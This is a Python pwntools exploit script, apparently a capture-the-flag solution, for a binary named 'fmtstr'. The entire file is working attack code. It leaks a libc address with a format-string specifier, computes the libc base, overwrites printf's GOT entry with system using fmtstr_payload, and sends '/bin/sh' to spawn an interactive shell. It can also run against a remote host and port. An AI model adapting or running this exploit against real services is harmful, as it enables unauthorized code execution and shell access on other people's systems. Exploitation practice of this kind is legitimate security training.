#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
		return gdb.debug([exe] + argv, gdbscript=gdbscript, env={"LD_PRELOAD": libc.path}, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([ld.path, '--preload', libc.path, exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
# b *0x401632
b *vuln+157
b *vuln+222
continue
'''.format(**locals())

exe = './fmtstr'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
ld = ELF('./ld-2.31.so', checksec=False)
# warning/info/debug
context.log_level = 'info'

offset = 6

io = start()

io.sendline(b'N')
# 1) leak libc address from stack.
io.sendlineafter(b'first input:\n', b'%9$p')
leaked_addr = int(str(io.recvline()[:-1], 'utf-8'), 16)
libc.address = leaked_addr - libc.sym['_IO_do_write'] - 25
print(hex(libc.address))
# 2) Overwrite a function got with system so you can put
io.sendlineafter(b'second input:\n', fmtstr_payload(offset, {elf.got.printf: libc.sym.system}, write_size='short'))
# 3) Put '/bin/sh' into that function
io.sendlineafter(b'last input:\n', b'/bin/sh')

io.interactive()